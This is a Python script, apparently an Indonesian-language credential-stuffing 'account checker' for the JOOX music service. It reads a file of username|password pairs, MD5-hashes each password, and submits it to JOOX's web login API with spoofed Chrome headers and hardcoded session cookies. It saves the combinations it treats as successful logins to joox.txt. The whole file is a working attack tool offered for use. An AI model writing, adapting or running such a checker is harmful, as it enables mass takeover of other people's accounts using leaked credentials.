#!/usr/bin/env python
# coding: utf-8
# Recode Mandul 7 turunan

from art import *
import requests, colorama, os, random, pyfiglet, hashlib, urllib.parse
from http import cookiejar
BLU = colorama.Style.BRIGHT + colorama.Fore.BLUE
CYA = colorama.Style.BRIGHT + colorama.Fore.CYAN
GRE = colorama.Style.BRIGHT + colorama.Fore.GREEN
YEL = colorama.Style.BRIGHT + colorama.Fore.YELLOW
RED = colorama.Style.BRIGHT + colorama.Fore.RED
MAG = colorama.Style.BRIGHT + colorama.Fore.MAGENTA
LIYEL = colorama.Style.BRIGHT + colorama.Fore.LIGHTYELLOW_EX
LIRED = colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX
LIMAG = colorama.Style.BRIGHT + colorama.Fore.LIGHTMAGENTA_EX
LIBLU = colorama.Style.BRIGHT + colorama.Fore.LIGHTBLUE_EX
LICYA = colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX
LIGRE = colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX
BOLD = colorama.Style.BRIGHT
RESET = colorama.Fore.RESET
CLEAR = 'cls' if os.name == 'nt' else 'clear'
COLORS = BLU, CYA, GRE, YEL, RED, MAG, LIYEL, LIRED, LIMAG, LIBLU, LICYA, LIGRE
FONTS = 'basic', 'o8', 'cosmic', 'graffiti', 'chunky', 'epic', 'doom', 'avatar', 'this',
font = random.choice(FONTS)
colorama.init(autoreset=True)
color2 = random.choice(COLORS)
#c = 0

class BlockCookies(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False
r = requests.Session()
r.cookies.set_policy(BlockCookies()) 


def logo() -> None:
    os.system(CLEAR)
    color1 = random.choice(COLORS)
    color2 = random.choice(COLORS)
    while color1 == color2:
        color2 = random.choice(COLORS)
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)
    print(color2 + pyfiglet.figlet_format('JOOX', font=font, justify='center', width=os.get_terminal_size().columns), end='')
    msg = '[Author RH DYAR AP]'
    _ = int(os.get_terminal_size().columns/2)
    _ -= int(len(msg)/2)
    print(color1 + '=' * _ + LIYEL + msg + color1 + '=' * _ + '\n')
logo()


d = input(f'{random.choice(COLORS)}                         Input List > ')
devices = open(d, 'r+',  encoding="utf-8").read().splitlines()

try:      
    for list in devices:
        pisah = list.strip()
        empas = list.split('|')

        usr = empas[0]
        pas = empas[1]
        account = usr+'|'+pas
        pwd = hashlib.md5(pas.encode())
        pwds = pwd.hexdigest()

    #print(f'{usr}={pwds}')

        cookies = {
            'user_type': '2',
            'country': 'id',
            'session_key': 'f5d911b42ce3323e1036664a80cea394',
            '_gid': 'GA1.2.595272572.1665037218',
            '_sa': 'SA1.2.2088586586.1665037218',
            '_rl_rl': '0',
            '_rlu': 'c182d87c-c202-43a0-9231-00202106bd14',
            '_rlg': 'rl',
            'initialTrafficSource': 'utmcsr=google|utmcmd=organic|utmccn=(not set)|utmctr=(not provided)',
            '__utmzzses': '1',
            'wmid': '291450121',
            'user_type': '2',
            '_gat': '1',
            'session_key': 'f5d911b42ce3323e1036664a80cea394',
            '_gat_UA-111116957-01': '1',
            '_dc_gtm_UA-99577967-18': '1',
            '_ga_XVRXFDKLKR': 'GS1.1.1665037219.1.1.1665037319.0.0.0',
            '_ga_YZ0JP5TEH1': 'GS1.1.1665037219.1.1.1665037319.55.0.0',
            '_ga': 'GA1.2.1022964033.1665037218',
        }

        headers = {
            'authority': 'api.joox.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            # Requests sorts cookies= alphabetically
            # 'cookie': 'user_type=2; country=id; session_key=f5d911b42ce3323e1036664a80cea394; _gid=GA1.2.595272572.1665037218; _sa=SA1.2.2088586586.1665037218; _rl_rl=0; _rlu=c182d87c-c202-43a0-9231-00202106bd14; _rlg=rl; initialTrafficSource=utmcsr=google|utmcmd=organic|utmccn=(not set)|utmctr=(not provided); __utmzzses=1; wmid=291450121; user_type=2; _gat=1; session_key=f5d911b42ce3323e1036664a80cea394; _gat_UA-111116957-01=1; _dc_gtm_UA-99577967-18=1; _ga_XVRXFDKLKR=GS1.1.1665037219.1.1.1665037319.0.0.0; _ga_YZ0JP5TEH1=GS1.1.1665037219.1.1.1665037319.55.0.0; _ga=GA1.2.1022964033.1665037218',
            'referer': 'https://www.joox.com/',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'script',
            'sec-fetch-mode': 'no-cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        }

        params = urllib.parse.urlencode(
            {
            'country': 'id',
            'lang': 'id',
            'wxopenid': usr,
            'password': pwds,
            'wmauth_type': '0',
            'authtype': '2',
            'time': '1665037331352',
            '_': '1665037331353',
            #'callback': 'axiosJsonpCallback2',
            }
        )


        response = requests.get('https://api.joox.com/web-fcgi-bin/web_wmauth', params=params, cookies=cookies, headers=headers)    
        if "captcha_token" in response.text:
            #info = requests.get('https://www.joox.com/id/vip', cookies=cookies, headers=headers)
            #paket = re.findall('', info)
        
            print(f"{GRE}[+]{account} => SUKSES LOGIN".center(os.get_terminal_size().columns))
            open('joox.txt', "a+").write(f'{account}\n')
        else:
            print(f"{RED}[-]{account} => GAGAl LOGIN".center(os.get_terminal_size().columns))   
except KeyboardInterrupt:
        print(f"{BOLD}Oh! you pressed CTRL + C.".center(os.get_terminal_size().columns))
        print(f"{BOLD}Proses Di hentikan :) ".center(os.get_terminal_size().columns))            